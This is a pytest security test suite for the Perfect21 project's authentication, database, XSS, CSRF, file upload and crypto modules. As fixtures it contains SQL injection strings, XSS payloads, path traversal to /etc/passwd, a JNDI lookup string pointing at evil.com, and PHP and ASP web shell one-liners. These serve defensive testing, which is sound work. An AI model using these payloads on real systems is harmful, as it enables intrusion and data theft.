#!/usr/bin/env python3
"""
Comprehensive security tests for Perfect21
Target: Security vulnerability detection and prevention
"""

import pytest
import hashlib
import jwt
import sqlite3
import os
import tempfile
import subprocess
import json
from pathlib import Path
from unittest.mock import patch, MagicMock
import sys

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from api.auth_api import AuthAPI
from modules.database import Database
from modules.secure_db import SecureDatabase


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication security"""

    @pytest.fixture
    def auth_api(self, tmp_path):
        """Create AuthAPI for security testing"""
        db_path = tmp_path / "security_test.db"
        return AuthAPI(db_path=str(db_path), secret_key="test_security_key_12345")

    def test_password_hashing_security(self, auth_api):
        """Test password hashing security"""
        passwords = [
            "password123",
            "SuperSecureP@ssw0rd!",
            "ðŸ”emoji_passwordðŸ”",
            "a" * 1000,  # Very long password
        ]

        hashed_passwords = []

        for password in passwords:
            # Register user with password
            result = auth_api.register_user(
                f"user_{len(hashed_passwords)}",
                password,
                f"user{len(hashed_passwords)}@example.com"
            )

            assert result['success'] is True

            # Get hashed password from database
            user = auth_api.user_manager.get_user_by_username(f"user_{len(hashed_passwords)}")
            hashed_password = user['password_hash']
            hashed_passwords.append(hashed_password)

            # Verify hash properties
            assert len(hashed_password) > 50  # Proper hash length
            assert password not in hashed_password  # Original password not stored
            assert hashed_password != password  # Hash is different from password

        # All hashes should be unique
        assert len(set(hashed_passwords)) == len(hashed_passwords)

    def test_jwt_token_security(self, auth_api):
        """Test JWT token security"""
        # Register and authenticate user
        auth_api.register_user("tokenuser", "password123", "token@example.com")
        auth_result = auth_api.authenticate("tokenuser", "password123")

        token = auth_result['access_token']

        # Test token structure
        token_parts = token.split('.')
        assert len(token_parts) == 3  # Header.Payload.Signature

        # Decode token (without verification for testing)
        import base64
        import json

        # Decode payload
        payload_b64 = token_parts[1]
        # Add padding if necessary
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload_bytes = base64.urlsafe_b64decode(payload_b64)
        payload = json.loads(payload_bytes)

        # Verify token contents
        assert 'username' in payload
        assert 'exp' in payload  # Expiration time
        assert 'iat' in payload  # Issued at time
        assert payload['username'] == "tokenuser"

        # Test token manipulation resistance
        manipulated_tokens = [
            token[:-10] + "tampered123",  # Modified signature
            token.replace(token_parts[1], base64.urlsafe_b64encode(
                json.dumps({'username': 'admin', 'exp': payload['exp']}).encode()
            ).decode().rstrip('=')),  # Modified payload
            "invalid.token.format",  # Invalid format
            "",  # Empty token
        ]

        for manipulated_token in manipulated_tokens:
            with pytest.raises(Exception):  # Should raise AuthError or similar
                auth_api.validate_token(manipulated_token)

    def test_session_security(self, auth_api):
        """Test session security"""
        # Register user
        auth_api.register_user("sessionuser", "password123", "session@example.com")

        # Create multiple sessions
        sessions = []
        for i in range(3):
            auth_result = auth_api.authenticate("sessionuser", "password123")
            sessions.append(auth_result['access_token'])

        # All sessions should be different
        assert len(set(sessions)) == len(sessions)

        # Logout from one session
        auth_api.logout(sessions[0])

        # First session should be invalid
        with pytest.raises(Exception):
            auth_api.validate_token(sessions[0])

        # Other sessions should still be valid
        for token in sessions[1:]:
            token_data = auth_api.validate_token(token)
            assert token_data['username'] == "sessionuser"

    def test_brute_force_protection(self, auth_api):
        """Test brute force attack protection"""
        # Register user
        auth_api.register_user("bruteuser", "correctpassword", "brute@example.com")

        # Enable rate limiting
        auth_api.enable_rate_limiting(max_attempts=3, window_minutes=5)

        # Make multiple failed attempts
        failed_attempts = 0
        for i in range(5):
            try:
                auth_api.authenticate("bruteuser", "wrongpassword")
            except Exception as e:
                failed_attempts += 1
                if i >= 3:  # After 3 attempts, should be rate limited
                    assert "rate limit" in str(e).lower()

        assert failed_attempts >= 3

        # Correct password should also be blocked due to rate limiting
        with pytest.raises(Exception) as exc_info:
            auth_api.authenticate("bruteuser", "correctpassword")
        assert "rate limit" in str(exc_info.value).lower()

    def test_account_enumeration_protection(self, auth_api):
        """Test protection against account enumeration"""
        # Register a user
        auth_api.register_user("realuser", "password123", "real@example.com")

        # Test with existing user
        try:
            auth_api.authenticate("realuser", "wrongpassword")
            existing_user_response = "success"
        except Exception as e:
            existing_user_response = str(e)

        # Test with non-existing user
        try:
            auth_api.authenticate("fakeuser", "wrongpassword")
            fake_user_response = "success"
        except Exception as e:
            fake_user_response = str(e)

        # Responses should be similar to prevent enumeration
        # Both should fail with similar error messages
        assert "success" not in existing_user_response
        assert "success" not in fake_user_response

        # Error messages should not reveal user existence
        assert "user not found" not in existing_user_response.lower()
        assert "user not found" not in fake_user_response.lower()

    def test_timing_attack_resistance(self, auth_api):
        """Test resistance to timing attacks"""
        import time

        # Register user
        auth_api.register_user("timinguser", "password123", "timing@example.com")

        # Measure authentication time for existing user
        existing_user_times = []
        for _ in range(10):
            start_time = time.time()
            try:
                auth_api.authenticate("timinguser", "wrongpassword")
            except:
                pass
            end_time = time.time()
            existing_user_times.append(end_time - start_time)

        # Measure authentication time for non-existing user
        fake_user_times = []
        for _ in range(10):
            start_time = time.time()
            try:
                auth_api.authenticate("nonexistentuser", "wrongpassword")
            except:
                pass
            end_time = time.time()
            fake_user_times.append(end_time - start_time)

        # Times should be similar to prevent timing attacks
        avg_existing = sum(existing_user_times) / len(existing_user_times)
        avg_fake = sum(fake_user_times) / len(fake_user_times)

        # Difference should be minimal (within 50% of average)
        time_difference = abs(avg_existing - avg_fake)
        average_time = (avg_existing + avg_fake) / 2
        relative_difference = time_difference / average_time

        assert relative_difference < 0.5  # Less than 50% difference


@pytest.mark.security
class TestSQLInjectionPrevention:
    """Test SQL injection prevention"""

    @pytest.fixture
    def secure_db(self, tmp_path):
        """Create secure database for testing"""
        db_path = tmp_path / "security_test.db"
        return SecureDatabase(str(db_path))

    def test_sql_injection_in_queries(self, secure_db):
        """Test SQL injection prevention in queries"""
        # Create test table
        secure_db.execute_query("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                email TEXT,
                role TEXT
            )
        """)

        # Insert test data
        secure_db.insert('users', {
            'username': 'testuser',
            'email': 'test@example.com',
            'role': 'user'
        })

        # SQL injection attempts
        injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES (999, 'hacker', 'hack@evil.com', 'admin'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "1; DELETE FROM users",
            "'; TRUNCATE TABLE users; --"
        ]

        for injection in injection_attempts:
            # Try injection in username search
            try:
                results = secure_db.execute_query(
                    "SELECT * FROM users WHERE username = ?",
                    (injection,)
                )
                # Should return empty or handle safely
                assert isinstance(results, (list, type(None)))
                if results:
                    # Should not return multiple users or unauthorized data
                    assert len(results) <= 1

            except Exception as e:
                # If exception is raised, it should be a safe handling
                # and not a SQL syntax error
                assert "syntax error" not in str(e).lower()

        # Verify data integrity
        all_users = secure_db.execute_query("SELECT * FROM users")
        assert len(all_users) == 1  # Original user should still exist
        assert all_users[0]['username'] == 'testuser'

    def test_parameterized_queries(self, secure_db):
        """Test parameterized query usage"""
        # Create test table
        secure_db.execute_query("""
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT,
                price REAL,
                category TEXT
            )
        """)

        # Insert data using parameterized queries
        test_products = [
            ("Product 1", 19.99, "electronics"),
            ("Product'; DROP TABLE products; --", 29.99, "books"),
            ("Product <script>alert('xss')</script>", 39.99, "toys")
        ]

        for name, price, category in test_products:
            secure_db.insert('products', {
                'name': name,
                'price': price,
                'category': category
            })

        # Verify all products were inserted safely
        all_products = secure_db.execute_query("SELECT * FROM products")
        assert len(all_products) == 3

        # Verify malicious content was stored as literal text
        malicious_product = secure_db.execute_query(
            "SELECT * FROM products WHERE name LIKE ?",
            ("%DROP TABLE%",)
        )
        assert len(malicious_product) == 1
        assert "DROP TABLE" in malicious_product[0]['name']

    def test_input_sanitization(self, secure_db):
        """Test input sanitization"""
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DELETE FROM users; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/payload}",
            "{{7*7}}",  # Template injection
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "\x00\x01\x02",  # Null bytes and control characters
        ]

        for malicious_input in malicious_inputs:
            sanitized = secure_db.sanitize_input(malicious_input)

            # Sanitized input should not contain dangerous patterns
            dangerous_patterns = [
                "<script", "javascript:", "data:", "DROP", "DELETE",
                "INSERT", "UPDATE", "UNION", "--", "/*", "*/", "\x00"
            ]

            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower()

            # Should still be a string
            assert isinstance(sanitized, str)


@pytest.mark.security
class TestCrossSiteScripting:
    """Test XSS prevention"""

    def test_output_encoding(self):
        """Test HTML output encoding"""
        from modules.security import SecurityUtils

        # XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "';alert('xss');//",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>"
        ]

        for payload in xss_payloads:
            # Test HTML encoding
            encoded = SecurityUtils.html_encode(payload)

            # Should not contain dangerous characters
            assert "<" not in encoded or "&lt;" in encoded
            assert ">" not in encoded or "&gt;" in encoded
            assert '"' not in encoded or "&quot;" in encoded
            assert "'" not in encoded or "&#x27;" in encoded

            # Test attribute encoding
            attr_encoded = SecurityUtils.html_attr_encode(payload)
            assert '"' not in attr_encoded or "&quot;" in attr_encoded

    def test_content_security_policy(self):
        """Test Content Security Policy implementation"""
        from modules.security import CSPManager

        csp_manager = CSPManager()

        # Set secure CSP policy
        policy = csp_manager.generate_policy({
            'default-src': ["'self'"],
            'script-src': ["'self'", "'unsafe-inline'"],
            'style-src': ["'self'", "'unsafe-inline'"],
            'img-src': ["'self'", "data:", "https:"],
            'font-src': ["'self'"],
            'connect-src': ["'self'"],
            'frame-ancestors': ["'none'"]
        })

        # Verify policy components
        assert "default-src 'self'" in policy
        assert "script-src 'self'" in policy
        assert "frame-ancestors 'none'" in policy

        # Test policy validation
        assert csp_manager.validate_policy(policy) is True

        # Test dangerous policy detection
        dangerous_policy = "script-src 'unsafe-eval'"
        assert csp_manager.is_policy_secure(dangerous_policy) is False

    def test_javascript_sanitization(self):
        """Test JavaScript sanitization"""
        from modules.security import JSSanitizer

        sanitizer = JSSanitizer()

        # Dangerous JS patterns
        dangerous_js = [
            "eval('malicious code')",
            "document.cookie = 'stolen'",
            "window.location = 'http://evil.com'",
            "fetch('/api/secret').then(r=>r.text()).then(console.log)",
            "new Function('return document.cookie')()",
            "setTimeout('alert(1)', 100)",
            "setInterval('malicious()', 1000)",
            "document.write('<script>alert(1)</script>')",
            "innerHTML = '<img src=x onerror=alert(1)>'"
        ]

        for js_code in dangerous_js:
            sanitized = sanitizer.sanitize(js_code)

            # Should remove dangerous functions
            dangerous_functions = [
                'eval', 'Function', 'setTimeout', 'setInterval',
                'document.write', 'innerHTML'
            ]

            for func in dangerous_functions:
                assert func not in sanitized or sanitized.count(func) < js_code.count(func)


@pytest.mark.security
class TestCrossSiteRequestForgery:
    """Test CSRF protection"""

    def test_csrf_token_generation(self):
        """Test CSRF token generation"""
        from modules.security import CSRFProtection

        csrf = CSRFProtection()

        # Generate tokens
        tokens = [csrf.generate_token() for _ in range(10)]

        # All tokens should be unique
        assert len(set(tokens)) == len(tokens)

        # Tokens should be of sufficient length
        for token in tokens:
            assert len(token) >= 32

        # Tokens should be alphanumeric
        for token in tokens:
            assert token.isalnum() or set(token).issubset(set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'))

    def test_csrf_token_validation(self):
        """Test CSRF token validation"""
        from modules.security import CSRFProtection

        csrf = CSRFProtection()

        # Generate valid token
        valid_token = csrf.generate_token()
        session_id = "test_session_123"

        # Store token
        csrf.store_token(session_id, valid_token)

        # Valid token should pass validation
        assert csrf.validate_token(session_id, valid_token) is True

        # Invalid tokens should fail
        invalid_tokens = [
            "invalid_token",
            "",
            None,
            valid_token + "tampered",
            valid_token[:-5],  # Truncated
            "a" * len(valid_token),  # Same length but different
        ]

        for invalid_token in invalid_tokens:
            assert csrf.validate_token(session_id, invalid_token) is False

    def test_csrf_double_submit_cookie(self):
        """Test CSRF double submit cookie pattern"""
        from modules.security import CSRFProtection

        csrf = CSRFProtection()

        # Generate token and cookie
        token = csrf.generate_token()
        cookie_value = csrf.generate_cookie_value(token)

        # Validate double submit
        assert csrf.validate_double_submit(token, cookie_value) is True

        # Mismatched values should fail
        wrong_cookie = csrf.generate_cookie_value(csrf.generate_token())
        assert csrf.validate_double_submit(token, wrong_cookie) is False


@pytest.mark.security
class TestFileUploadSecurity:
    """Test file upload security"""

    def test_file_type_validation(self):
        """Test file type validation"""
        from modules.security import FileValidator

        validator = FileValidator()

        # Safe file types
        safe_files = [
            ("document.pdf", b"%PDF-1.4"),
            ("image.jpg", b"\xff\xd8\xff"),
            ("image.png", b"\x89PNG\r\n\x1a\n"),
            ("text.txt", b"Hello, world!"),
            ("data.json", b'{"key": "value"}')
        ]

        for filename, content in safe_files:
            assert validator.is_safe_file(filename, content) is True

        # Dangerous file types
        dangerous_files = [
            ("script.exe", b"MZ\x90\x00"),  # PE executable
            ("virus.bat", b"@echo off\ndel *.*"),
            ("malware.scr", b"MZ\x90\x00"),
            ("backdoor.php", b"<?php system($_GET['cmd']); ?>"),
            ("shell.jsp", b"<%@ page import=\"java.io.*\" %>"),
            ("payload.asp", b"<%eval request(\"cmd\")%>")
        ]

        for filename, content in dangerous_files:
            assert validator.is_safe_file(filename, content) is False

    def test_file_size_limits(self):
        """Test file size limits"""
        from modules.security import FileValidator

        validator = FileValidator(max_size=1024*1024)  # 1MB limit

        # File within limit
        small_content = b"x" * (500 * 1024)  # 500KB
        assert validator.validate_size("small.txt", small_content) is True

        # File exceeding limit
        large_content = b"x" * (2 * 1024 * 1024)  # 2MB
        assert validator.validate_size("large.txt", large_content) is False

    def test_filename_sanitization(self):
        """Test filename sanitization"""
        from modules.security import FileValidator

        validator = FileValidator()

        # Dangerous filenames
        dangerous_names = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file.txt\x00.exe",  # Null byte injection
            "CON.txt",  # Windows reserved name
            "aux.pdf",  # Windows reserved name
            "<script>alert(1)</script>.txt",
            "file|with|pipes.txt",
            "file:with:colons.txt",
            "file*with*wildcards.txt"
        ]

        for dangerous_name in dangerous_names:
            sanitized = validator.sanitize_filename(dangerous_name)

            # Should not contain path traversal
            assert ".." not in sanitized
            assert "/" not in sanitized or sanitized.count("/") == 0
            assert "\\" not in sanitized

            # Should not contain null bytes
            assert "\x00" not in sanitized

            # Should not be a reserved name
            reserved_names = ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]
            assert sanitized.upper() not in reserved_names

    def test_image_file_security(self):
        """Test image file security"""
        from modules.security import ImageValidator

        validator = ImageValidator()

        # Test image with embedded script (simulated)
        malicious_image = b"\xff\xd8\xff" + b"<script>alert('xss')</script>" + b"\xff\xd9"

        # Should detect and reject malicious content
        assert validator.is_safe_image("malicious.jpg", malicious_image) is False

        # Test oversized image
        huge_image = b"\xff\xd8\xff" + b"x" * (50 * 1024 * 1024) + b"\xff\xd9"  # 50MB
        assert validator.validate_image_size("huge.jpg", huge_image) is False


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic security"""

    def test_password_hashing(self):
        """Test password hashing security"""
        from modules.security import PasswordHasher

        hasher = PasswordHasher()

        passwords = [
            "simplepassword",
            "C0mpl3x!P@ssw0rd",
            "ðŸ”unicode_passwordðŸ”",
            "a" * 1000  # Very long password
        ]

        for password in passwords:
            # Hash password
            hashed = hasher.hash_password(password)

            # Verify hash properties
            assert len(hashed) > 50  # Sufficient length
            assert password not in hashed  # Original not stored
            assert hashed != password  # Different from original

            # Verify password
            assert hasher.verify_password(password, hashed) is True

            # Wrong password should fail
            assert hasher.verify_password(password + "wrong", hashed) is False

        # Same password should produce different hashes (salted)
        hash1 = hasher.hash_password("samepassword")
        hash2 = hasher.hash_password("samepassword")
        assert hash1 != hash2

    def test_encryption_security(self):
        """Test encryption security"""
        from modules.security import DataEncryption

        encryption = DataEncryption()

        # Test data
        test_data = [
            "sensitive information",
            json.dumps({"secret": "value", "user_id": 12345}),
            "ðŸ”unicode_dataðŸ”",
            "x" * 10000  # Large data
        ]

        for data in test_data:
            # Encrypt data
            encrypted = encryption.encrypt(data)

            # Verify encryption properties
            assert encrypted != data  # Should be different
            assert len(encrypted) > len(data)  # Should be longer
            assert data not in encrypted  # Original not visible

            # Decrypt data
            decrypted = encryption.decrypt(encrypted)
            assert decrypted == data  # Should match original

        # Same data should produce different ciphertext (IV/nonce)
        cipher1 = encryption.encrypt("same data")
        cipher2 = encryption.encrypt("same data")
        assert cipher1 != cipher2

    def test_random_number_security(self):
        """Test cryptographically secure random number generation"""
        from modules.security import SecureRandom

        random_gen = SecureRandom()

        # Test random bytes
        random_bytes_sets = []
        for _ in range(100):
            random_bytes = random_gen.generate_bytes(32)
            assert len(random_bytes) == 32
            random_bytes_sets.append(random_bytes)

        # All should be unique
        assert len(set(random_bytes_sets)) == len(random_bytes_sets)

        # Test random strings
        random_strings = []
        for _ in range(100):
            random_string = random_gen.generate_string(32)
            assert len(random_string) == 32
            random_strings.append(random_string)

        # All should be unique
        assert len(set(random_strings)) == len(random_strings)

        # Test randomness distribution
        random_numbers = [random_gen.generate_int(0, 100) for _ in range(1000)]

        # Should use full range
        assert min(random_numbers) < 10
        assert max(random_numbers) > 90

        # Should be reasonably distributed
        unique_numbers = len(set(random_numbers))
        assert unique_numbers > 70  # At least 70% unique values


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers"""

    def test_security_headers_implementation(self):
        """Test security headers implementation"""
        from modules.security import SecurityHeaders

        headers = SecurityHeaders()

        # Generate security headers
        security_headers = headers.get_security_headers()

        # Required security headers
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy'
        ]

        for header in required_headers:
            assert header in security_headers

        # Verify header values
        assert security_headers['X-Content-Type-Options'] == 'nosniff'
        assert security_headers['X-Frame-Options'] == 'DENY'
        assert 'max-age' in security_headers['Strict-Transport-Security']

    def test_hsts_header_security(self):
        """Test HSTS header security"""
        from modules.security import SecurityHeaders

        headers = SecurityHeaders()

        hsts_header = headers.get_hsts_header()

        # Should include max-age
        assert 'max-age=' in hsts_header

        # Should include includeSubDomains
        assert 'includeSubDomains' in hsts_header

        # Should include preload
        assert 'preload' in hsts_header

        # Max-age should be reasonable (at least 1 year)
        import re
        max_age_match = re.search(r'max-age=(\d+)', hsts_header)
        assert max_age_match
        max_age = int(max_age_match.group(1))
        assert max_age >= 31536000  # 1 year in seconds


@pytest.mark.security
class TestIntegrationSecurity:
    """Test integration security scenarios"""

    def test_complete_authentication_security_flow(self, tmp_path):
        """Test complete authentication security flow"""
        # Create secure auth system
        db_path = tmp_path / "secure_flow_test.db"
        auth_api = AuthAPI(db_path=str(db_path), secret_key="super_secure_key_12345")

        # Enable all security features
        auth_api.enable_rate_limiting(max_attempts=3, window_minutes=5)
        auth_api.enable_account_lockout(max_attempts=5, lockout_minutes=10)
        auth_api.enable_password_policy(
            min_length=12,
            require_uppercase=True,
            require_lowercase=True,
            require_numbers=True,
            require_special=True
        )

        # 1. Secure registration
        secure_password = "SecureP@ssw0rd123!"
        result = auth_api.register_user(
            "secureuser",
            secure_password,
            "secure@example.com"
        )
        assert result['success'] is True

        # 2. Secure authentication
        auth_result = auth_api.authenticate("secureuser", secure_password)
        assert auth_result['success'] is True
        token = auth_result['access_token']

        # 3. Token validation
        token_data = auth_api.validate_token(token)
        assert token_data['username'] == "secureuser"

        # 4. Security attack simulation
        # SQL injection attempt
        with pytest.raises(Exception):
            auth_api.authenticate("secureuser'; DROP TABLE users; --", "anypassword")

        # Brute force attempt
        for _ in range(4):  # Exceed rate limit
            try:
                auth_api.authenticate("secureuser", "wrongpassword")
            except:
                pass

        # Should be rate limited now
        with pytest.raises(Exception) as exc_info:
            auth_api.authenticate("secureuser", secure_password)
        assert "rate limit" in str(exc_info.value).lower()

    def test_api_security_integration(self, tmp_path):
        """Test API security integration"""
        from api.rest_server import create_app

        # Create app with security enabled
        app = create_app(
            db_path=str(tmp_path / "api_security.db"),
            security_enabled=True
        )

        # Test security middleware
        with app.test_client() as client:
            # Test security headers
            response = client.get('/api/status')
            assert 'X-Content-Type-Options' in response.headers
            assert 'X-Frame-Options' in response.headers

            # Test CSRF protection
            response = client.post('/api/users', json={'name': 'test'})
            # Should require CSRF token or fail appropriately
            assert response.status_code in [400, 401, 403, 422]

            # Test input validation
            malicious_payloads = [
                {'name': '<script>alert("xss")</script>'},
                {'name': "'; DROP TABLE users; --"},
                {'name': '../../etc/passwd'},
            ]

            for payload in malicious_payloads:
                response = client.post('/api/users', json=payload)
                # Should handle malicious input safely
                assert response.status_code != 500  # Should not crash


if __name__ == "__main__":
    pytest.main([__file__, "-v"])